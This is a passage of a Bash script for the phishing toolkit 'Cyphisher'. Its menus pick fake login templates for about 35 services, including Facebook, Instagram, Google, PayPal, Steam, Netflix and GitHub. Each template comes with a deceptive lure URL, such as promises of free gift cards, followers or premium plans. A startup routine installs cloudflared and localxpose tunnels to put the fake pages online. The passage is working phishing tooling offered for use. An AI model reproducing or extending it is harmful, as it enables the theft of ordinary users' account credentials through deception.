			website="fb_messenger"
			mask='https://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			log_error "Invalid Option, Try Again..."
			{ sleep 1; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	{ clear; banner_small; }
	echo ""
	draw_header "INSTAGRAM TEMPLATES"
	echo ""
	menu_opt "01" "Traditional Login"
	menu_opt "02" "Auto Followers Login"
	menu_opt "03" "1000 Followers Login"
	menu_opt "04" "Blue Badge Verify"
	menu_opt "05" "\$50 Creator Fund"
	echo ""
	draw_line
	menu_opt "00" "Back to Main Menu"
	prompt_input

	case $REPLY in 
		0 | 00)
			log_ok "Returning to main menu..."
			{ sleep 1; main_menu; };;
		1 | 01)
			website="instagram"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='https://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='https://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		5 | 05)
			website="ig_creator_fund"
			mask='https://claim-50-creator-fund-bonus-instagram'
			tunnel_menu;;
		*)
			log_error "Invalid Option, Try Again..."
			{ sleep 1; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	{ clear; banner_small; }
	echo ""
	draw_header "GOOGLE / GMAIL TEMPLATES"
	echo ""
	menu_opt "01" "Gmail Old Login"
	menu_opt "02" "Gmail New Login"
	menu_opt "03" "Advanced Voting Poll"
	echo ""
	draw_line
	menu_opt "00" "Back to Main Menu"
	prompt_input

	case $REPLY in 
		0 | 00)
			log_ok "Returning to main menu..."
			{ sleep 1; main_menu; };;
		1 | 01)
			website="google"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			log_error "Invalid Option, Try Again..."
			{ sleep 1; site_gmail; };;
	esac
}

## Vk
site_vk() {
	{ clear; banner_small; }
	echo ""
	draw_header "VK TEMPLATES"
	echo ""
	menu_opt "01" "Traditional Login"
	menu_opt "02" "Voting Poll Login"
	echo ""
	draw_line
	menu_opt "00" "Back to Main Menu"
	prompt_input

	case $REPLY in 
		0 | 00)
			log_ok "Returning to main menu..."
			{ sleep 1; main_menu; };;
		1 | 01)
			website="vk"
			mask='https://vk-premium-real-method-2020'
			tunnel_menu;;
		2 | 02)
			website="vk_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			log_error "Invalid Option, Try Again..."
			{ sleep 1; site_vk; };;
	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	draw_header "SELECT TARGET PLATFORM"
	echo ""
	printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "01" "Facebook"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "11" "Twitch"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%s${RESET}\n" "21" "DeviantArt"
	printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "02" "Instagram"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "12" "Pinterest"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%s${RESET}\n" "22" "Badoo"
	printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "03" "Google"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "13" "Snapchat"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%s${RESET}\n" "23" "Origin"
	printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "04" "Microsoft"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "14" "Linkedin"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%s${RESET}\n" "24" "DropBox"
	printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "05" "Netflix"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "15" "Ebay"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%s${RESET}\n" "25" "Yahoo"
	printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "06" "Paypal"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "16" "Quora"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%s${RESET}\n" "26" "Wordpress"
	printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "07" "Steam"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "17" "Protonmail"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%s${RESET}\n" "27" "Yandex"
	printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "08" "Twitter"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "18" "Spotify"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%s${RESET}\n" "28" "StackOverflow"
	printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "09" "Playstation"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "19" "Reddit"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%s${RESET}\n" "29" "Vk"
	printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "10" "Tiktok"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "20" "Adobe"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%s${RESET}\n" "30" "XBOX"
	printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "31" "Mediafire"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "32" "Gitlab"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%s${RESET}\n" "33" "Github"
	printf "  ${CYAN}  [${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%-14s${RESET}" "34" "Discord"
	printf "${CYAN}[${BOLD}${WHITE}%s${RESET}${CYAN}]${RESET} ${WHITE}%s${RESET}\n" "35" "Roblox"
	echo ""
	draw_line
	menu_opt "99" "About"
	menu_opt "00" "Exit"
	prompt_input "Select target"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="microsoft"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='https://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='https://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='https://tiktok-free-liker'
			tunnel_menu;;
		11)
			website="twitch"
			mask='https://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		12)
			website="pinterest"
			mask='https://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		13)
			website="snapchat"
			mask='https://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		14)
			website="linkedin"
			mask='https://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		15)
			website="ebay"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		16)
			website="quora"
			mask='https://quora-premium-for-free'
			tunnel_menu;;
		17)
			website="protonmail"
			mask='https://protonmail-pro-basics-for-free'
			tunnel_menu;;
		18)
			website="spotify"
			mask='https://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		19)
			website="reddit"
			mask='https://reddit-official-verified-member-badge'
			tunnel_menu;;
		20)
			website="adobe"
			mask='https://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		21)
			website="deviantart"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		22)
			website="badoo"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		23)
			website="origin"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		24)
			website="dropbox"
			mask='https://get-1TB-cloud-storage-free'
			tunnel_menu;;
		25)
			website="yahoo"
			mask='https://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		26)
			website="wordpress"
			mask='https://unlimited-wordpress-traffic-free'
			tunnel_menu;;
		27)
			website="yandex"
			mask='https://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		28)
			website="stackoverflow"
			mask='https://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		29)
			site_vk;;
		30)
			website="xbox"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		31)
			website="mediafire"
			mask='https://get-1TB-on-mediafire-free'
			tunnel_menu;;
		32)
			website="gitlab"
			mask='https://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		33)
			website="github"
			mask='https://get-1k-followers-on-github-free'
			tunnel_menu;;
		34)
			website="discord"
			mask='https://get-discord-nitro-free'
			tunnel_menu;;
		35)
			website="roblox"
			mask='https://get-free-robux'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			log_error "Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## ═══════════════════════════════════════
## Animated Startup Sequence
## ═══════════════════════════════════════
clear
echo ""
echo -e "${CYAN}"
typewriter "  [████████████████████████████████████████]" 0.01
typewriter "  [   C Y P H I S H E R   v${__version__}          ]" 0.03
typewriter "  [   by AsHfIEXE                        ]" 0.03
typewriter "  [████████████████████████████████████████]" 0.01
echo -e "${RESET}"
loading_bar "Initializing core modules"
sleep 0.3
kill_pid
dependencies
check_status
loading_bar "Loading tunnel services"
install_cloudflared
install_localxpose
echo ""
log_ok "${GREEN}${BOLD}Cyphisher is ready! Launching main menu...${RESET}"
sleep 1
main_menu
